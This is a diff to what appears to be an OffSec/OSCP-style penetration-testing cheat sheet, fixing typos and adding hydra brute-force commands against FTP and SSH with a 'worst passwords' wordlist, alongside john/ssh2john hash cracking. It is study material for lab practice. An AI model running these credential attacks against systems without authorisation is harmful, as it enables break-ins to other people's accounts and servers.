@@ -483,7 +483,8 @@ useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, th
 
 ## Password-Hash Cracking
 
-*Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) 
+*Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)  </br>
+## Password file saw in offsec discord 500-worst-passwords.txt 
 
 ### fcrackzip
 
@@ -708,7 +709,7 @@ Test-NetConnection -Port <port> <IP>   #powershell utility
 
 ```powershell
 ftp <IP>
-#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith Anonymous:password
+#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith anonymous:password
 
 put <file> #uploading file
 get <file> #downloading file
@@ -718,7 +719,8 @@ locate .nse | grep ftp
 nmap -p21 --script=<name> <IP>
 
 #bruteforce
-hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and viceversa
+hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice-versa
+hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ftp
 
 #check for vulnerabilities associated with the version identified.
 ```
@@ -738,7 +740,8 @@ ssh2john id_ecdsa(or)id_rsa > hash
 john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 
 #bruteforce
-hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and viceversa
+hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice-versa
+hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ssh
 
 #check for vulnerabilities associated with the version identified.
 ```
